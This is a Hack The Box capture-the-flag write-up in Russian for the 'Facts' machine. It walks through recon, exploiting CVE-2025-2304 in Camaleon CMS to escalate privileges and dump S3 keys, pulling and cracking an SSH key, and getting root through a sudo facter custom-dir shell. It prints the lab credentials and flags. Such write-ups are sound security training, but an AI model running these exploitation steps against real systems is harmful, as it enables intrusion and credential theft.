# Facts - HTB writeup by innongrf

**URL:** https://app.hackthebox.com/machines/Facts

---

## 1. Recon

```bash
nmap -sV -sC 10.129.60.214 -oN scan.txt
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Открытые порты: **22 (SSH)**, **80 (HTTP)**

---

## 2. Enumeration

Используем флаг `-v` чтобы видеть адреса редиректов:

```bash
ffuf -u "http://facts.htb/FUZZ" -w /usr/share/wordlists/common.txt -v
```

Видим редирект 302 на `/admin`:

```
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1919ms]
| URL | http://facts.htb/admin
| --> | http://facts.htb/admin/login
    * FUZZ: admin
```

Заходим на `facts.htb/admin/login` и создаем нового юзера с кредами user:user.

Заметки:
- `/admin/profile/edit` — Role: **Client**
- `/admin/dashboard` — **Camaleon CMS version 2.9.0**

---

## 3. Vulnerability Assessment

Ищем CVE для Camaleon CMS v2.9.0, находим **CVE-2025-2304**:
https://github.com/Alien0ne/CVE-2025-2304

Уязвимость позволяет авторизованному юзеру повысить привилегии, изменять пароли других юзеров и извлекать aws секреты.

---

## 4. Exploitation — CVE-2025-2304

```bash
python3 exploit.py -u http://facts.htb -U user -P user --newpass new_user_pass -e -r
```

```
[+] Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+] Login confirmed
    User ID: 5
    Current User Role: client
[+] Loading PRIVILEGE ESCALATION
    User ID: 5
    Updated User Role: admin
[+] Extracting S3 Credentials
    s3 access key: AKIAA2D42557DF7DAA68
    s3 secret key: TqZ9yQ3batjGOpdmEFf7FN5jYzyQtYR9j12Icfv0
    s3 endpoint: http://localhost:54321
[+] Reverting User Role
    User ID: 5
    User Role: client
```

Настраиваем aws с полученными кредами:

```bash
aws configure
```

```
AWS Access Key ID:     AKIAA2D42557DF7DAA68
AWS Secret Access Key: TqZ9yQ3batjGOpdmEFf7FN5jYzyQtYR9j12Icfv0
Default region name:   us-east-1
```

Получаем список бакетов:

```bash
aws --endpoint-url http://facts.htb:54321 s3 ls
```

```
internal
randomfacts
```

Листинг бакета `internal`:

```bash
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal
```

```
PRE .bundle/
PRE .cache/
PRE .ssh/
220 .bash_logout
3900 .bashrc
 20 .lesshst
807 .profile
```

Скачиваем приватный ключ из `.ssh`:

```bash
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 id_ed25519
```

При попытке подключения оказывается что ключ зашифрован. Извлекаем хеш через `ssh2john` и брутим через `john` с `rockyou.txt`:

```
dragonballz
```

```bash
ssh -i id_ed25519 trivia@facts.htb
Enter passphrase for key 'id_ed25519': dragonballz
```

```
User Flag: 785f6aad17895336c80e5ee013ec411a
```

> `/home/william/user.txt`

---

## 5. Privilege Escalation

Смотрим права текущего юзера:

```bash
trivia@facts:/home/william$ sudo -l
```

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

`facter` — программа на Ruby которая выводит факты о системе. Мы можем запускать ее от root без пароля. Воспользуемся этим и запустим шелл `/bin/sh` от рута:

```bash
echo 'exec "/bin/sh"' > expl.rb
sudo /usr/bin/facter --custom-dir /home/trivia/ expl
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

```
Root Flag: 0415bbb8217f04b6b4b2d0c3e95dfdad
```

> `/root/root.txt`
